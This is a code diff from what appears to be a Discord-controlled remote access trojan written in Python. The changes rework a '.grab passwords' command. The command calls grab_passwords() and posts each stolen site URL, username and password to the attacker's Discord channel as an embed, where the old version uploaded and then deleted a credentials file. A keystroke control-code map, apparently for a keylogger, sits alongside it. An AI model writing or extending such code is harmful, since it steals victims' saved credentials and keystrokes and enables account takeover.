@@ -74,7 +74,7 @@ client = discord.Client(intents=discord.Intents.all())
 bundle_dir = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
 opuslib_path = os.path.abspath(os.path.join(bundle_dir, './libopus-0.x64.dll'))
 
-discord.opus.load_opus(opuslib_path)
+#discord.opus.load_opus(opuslib_path)
     
 ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\t': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
 text_buffor, force_to_send = '', False
@@ -559,10 +559,12 @@ async def on_message(message):
                     reaction_msg = await message.channel.send('```Syntax: .grab <what-to-grab>```'); await reaction_msg.add_reaction('🔴')    
                 else:
                     if message.content[6:] == 'passwords':
-                        grab_passwords()
-                        reaction_msg = await message.channel.send('``Grabbed passwords:``', file=discord.File('credentials.txt', filename='credentials.txt')); await reaction_msg.add_reaction('📌')
-                        os.system('del credentials.txt')
-
+                        result = grab_passwords()
+                        embed=discord.Embed(title='Grabbed saved passwords', color=0x0084ff)
+                        for url in result.keys():
+                            embed.add_field(name='🔗 ' + url, value='👤 ' + result[url][0] + '\n🔑 ' + result[url][1], inline=False)
+                        await message.channel.send(embed=embed)
+                        
                     elif message.content[6:] == 'history':
                         with open('history.txt', 'w') as history:
                             for entry in get_history().histories:
